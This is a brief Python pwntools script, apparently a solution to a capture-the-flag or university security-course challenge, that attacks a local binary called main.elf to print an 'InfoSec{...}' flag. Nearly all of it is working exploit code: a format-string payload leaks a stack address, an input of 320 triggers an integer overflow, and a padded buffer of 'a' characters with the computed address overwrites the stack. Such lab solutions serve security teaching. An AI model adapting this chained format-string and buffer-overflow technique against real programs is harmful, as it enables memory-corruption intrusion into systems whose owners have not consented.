#!/usr/bin/env python3
from pwn import *
import re

context.log_level = 'error'

# Run process
io = process("./main.elf")

# Username + Calculate randomNumbers address
io.sendline(b'%x.' * 10 + b'\x00')
io.recvline()
io.recvline()
mainAdr = io.recvline().decode('ascii').split('.')[9].strip()
randomNumsAdr = p32(int(mainAdr, 16) + 11195)

# Int overflow
io.sendline(b'320')

# Buffer (stack) overflow
io.sendline(b'a' * 100 + randomNumsAdr)

# Do the flag reading thingy with REEEEEEEEEEE (Regular Expression stolen from professor MartinSchwarzl, all credits go to him)
r = io.recvall().decode('ascii', errors='ignore')
flag_regex = re.compile('(InfoSec{.+[^}]})')
flag = flag_regex.findall(r)
flag = flag[0]
print(flag)